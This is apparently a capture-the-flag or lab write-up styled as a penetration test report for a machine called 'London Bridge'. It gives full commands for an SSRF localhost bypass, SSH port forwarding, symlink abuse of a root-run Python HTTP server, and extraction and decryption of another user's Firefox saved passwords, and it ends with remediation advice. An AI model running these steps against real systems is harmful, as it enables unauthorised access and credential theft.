# London Bridge – Full Professional Penetration Test Report (Complete Commands)

## 1. Executive Summary

This report documents the full compromise of the London Bridge machine through SSRF, misconfiguration, and credential extraction.

---

## 2. Full Attack Chain

Recon → SSRF → File Read → SSH → Root Service Abuse → Symlink → Credential Dump

---

## 3. Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oN scan.txt <TARGET_IP>
```

Result:
- 22/tcp → SSH
- 8080/tcp → Web (Gunicorn)

---

## 4. Web Exploitation

### Parameter Discovery

```bash
arjun -u http://<TARGET>:8080/view_image -m POST
```

Found:
```
www
```

---

### SSRF Exploitation

```bash
curl -X POST http://<TARGET>:8080/view_image -d "www=http://example.com"
```

---

### Localhost Bypass

```bash
curl -X POST http://<TARGET>:8080/view_image -d "www=http://127.1:8080"
```

---

## 5. SSH Access

```bash
chmod 600 key.pem
ssh -i key.pem beth@<TARGET>
```

---

## 6. Discovering Root Service

### Check listening ports

```bash
ss -tunlp
```

Result:
```
127.0.0.1:80 LISTEN
```

---

### Identify process

```bash
ps aux | grep http.server
```

Result:
```
root python3 -m http.server 80 --bind 127.0.0.1
```

---

## 7. Port Forwarding

Expose internal port 80:

```bash
ssh -i key.pem beth@<TARGET> -L 8081:127.0.0.1:80
```

Access locally:

```bash
http://127.0.0.1:8081
```

---

## 8. Symlink Exploitation

```bash
ln -s / rootlink
```

Access root filesystem:

```bash
curl http://127.0.0.1:8081/rootlink/
```

---

## 9. Accessing Restricted User Data

```bash
ln -s /home/charle charlelink
curl http://127.0.0.1:8081/charlelink/
```

---

## 10. Firefox Credential Extraction

### Locate files

```bash
curl http://127.0.0.1:8081/charlelink/.mozilla/firefox/
```

---

### Download profile

```bash
wget -r -np -nH --cut-dirs=3 http://127.0.0.1:8081/charlelink/.mozilla/firefox/<profile>/
```

---

## 11. Decrypt Credentials

```bash
pip install firefox_decrypt
firefox_decrypt .
```

---

## 12. Final Credentials

Recovered:
- Username: charle
- Password: <PASSWORD>

---

## 13. Key Takeaways

- SSRF allows internal pivoting
- Localhost bypass techniques are critical
- Root services must never expose filesystem
- Symlink abuse bypasses permissions
- Browser credential storage is a goldmine

---

## 14. Remediation

- Validate user input (SSRF prevention)
- Restrict internal network access
- Do not run services as root
- Disable directory listing
- Protect sensitive files
- Use least privilege

---

## 15. Conclusion

This attack chain demonstrates that:

> File read as root can fully compromise a system without needing a root shell.

